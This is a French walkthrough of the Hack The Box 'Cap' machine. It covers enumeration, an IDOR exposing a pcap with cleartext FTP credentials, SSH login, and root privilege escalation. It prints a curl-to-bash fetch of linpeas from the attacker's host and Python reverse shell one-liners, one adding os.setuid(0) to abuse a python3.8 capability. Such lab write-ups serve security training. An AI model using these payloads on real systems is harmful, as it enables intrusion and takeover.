# Cap [Linux] Easy

[https://app.hackthebox.com/machines/Cap](https://app.hackthebox.com/machines/Cap)

**— 1. Enumeration —**

`nmap -sC -sV 10.10.10.245`

A partir de la nous voyons que la machine héberge un serveur Apache.

**— 2. Le site & Pcap —**

Sur le site il n’y a pas de vulnérabilité c’est un site vitrine.

![Untitled](Cap%20%5BLinux%5D%20Easy%2096a2a0035b50428d9b105b47cdb76546/Untitled.png)

Et la première chose que nous pouvons faire est allé sur la page la plus suspecte “Security Snapshot (5 Second PCAP + Analysis).

Quand on change l’uri pour 10.10.10.245/data/0 on tombe sur un pcap plus remplit que les autres pages. C’est un IDOR.

![Untitled](Cap%20%5BLinux%5D%20Easy%2096a2a0035b50428d9b105b47cdb76546/Untitled%201.png)

On Download le pcap et passons a l’analyse.

**— 3. Analyse avec WireShark —**

On regarde les protocoles utilisé le FTP est utilisé c’est parfait car il affiche tout en clair.

On vois que l’utilisateur nathan c’est connecté.

On récupère ces logs `nathan:Buck3tH4TF0RM3!`

On se connecte au ssh du serveur port 22 et nathan réutilise ces mot de passe ce qui nous permet de se connecter a son ordinateur.

on prend directement le `flag.txt`

**— 4. LinuxEnumeratrion & Escalation Privilege —**

Il ne manque plus que le root.txt pour finir la machine.

Alternative : `curl [http://10.10.14.24/linpeas.sh](http://10.10.14.24/linpeas.sh) | bash`

On créé un serveur python `python -m http.server 80` sur notre machine avec linpeas (liens ⬇️)

[Releases · carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng/releases)

LinPeas trouve énormément de chose mais le plus intéressant sont celle qui sont surligné en jaune.

Sur cette machine voici la vulnérabilité :

![Untitled](Cap%20%5BLinux%5D%20Easy%2096a2a0035b50428d9b105b47cdb76546/Untitled%202.png)

Cette vulnérabilité est connu il suffit de lancer un payload de reverse shell avec la commande python à exploiter et ca version.

Le payload originel de PayloadsAllTheThings (Liens a la fin) :

```python
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Le payload modifié pour cette exploit : ( Noter que nous avons rajouter 3.8 à python pour ça version et rajouter os.setuid(0) pour exploiter la vulnérabilité). 

```python
export RHOST="10.0.0.1";export RPORT=4242;python3.8 -c 'import socket,os,pty;os.setuid(0);s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Vous devez impérativement mettre un netcat sur le port de votre payload python: 

`netcat -lvnp 4242`

Il ne reste plus qu’à récupérer le flag `root.txt` dans /root.

**Ressources :**

[PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)